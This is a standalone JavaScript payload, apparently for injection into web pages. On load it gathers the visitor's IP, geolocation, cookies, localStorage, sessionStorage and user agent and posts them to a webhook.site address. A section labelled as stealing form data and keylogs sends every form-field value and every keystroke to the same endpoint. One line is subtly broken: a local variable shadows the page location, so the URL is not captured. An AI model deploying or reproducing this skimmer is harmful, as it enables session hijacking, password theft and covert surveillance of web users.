javascript
/* Edit WEBHOOK_URL to your test webhook.site URL */
const WEBHOOK_URL = 'https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f';

async function getIP() {
  try {
    const resp = await fetch('https://api.ipify.org?format=json');
    const j = await resp.json();
    return j.ip || 'unknown';
  } catch (err) {
    console.error('IP lookup failed:', err);
    return 'unknown';
  }
}

async function getLocation(ip) {
  try {
    const resp = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await resp.json();
    return {
      city: data.city,
      region: data.region,
      country: data.country_name,
      org: data.org,
    };
  } catch (err) {
    console.error('Location lookup failed:', err);
    return {};
  }
}

async function sendData() {
  const ip = await getIP();
  const location = await getLocation(ip);
  const payload = {
    ip,
    ...location,
    cookie: document.cookie, // only non-HttpOnly cookies
    userAgent: navigator.userAgent,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: location.href,
    ts: new Date().toISOString(),
  };

  try {
    const r = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    console.log('Payload sent, status:', r.status);
  } catch (err) {
    console.error('Error sending payload:', err);
  }
}

window.addEventListener('load', sendData);

// Additional features: Steal form data and keylogs
document.addEventListener('input', (e) => {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
    const payload = {
      type: 'input',
      target: e.target.name || e.target.id || e.target.className,
      value: e.target.value,
      ts: new Date().toISOString(),
    };
    sendPayload(payload);
  }
});

document.addEventListener('keydown', (e) => {
  const payload = {
    type: 'keylog',
    key: e.key,
    ts: new Date().toISOString(),
  };
  sendPayload(payload);
});

async function sendPayload(payload) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.error('Error sending payload:', err);
  }
}
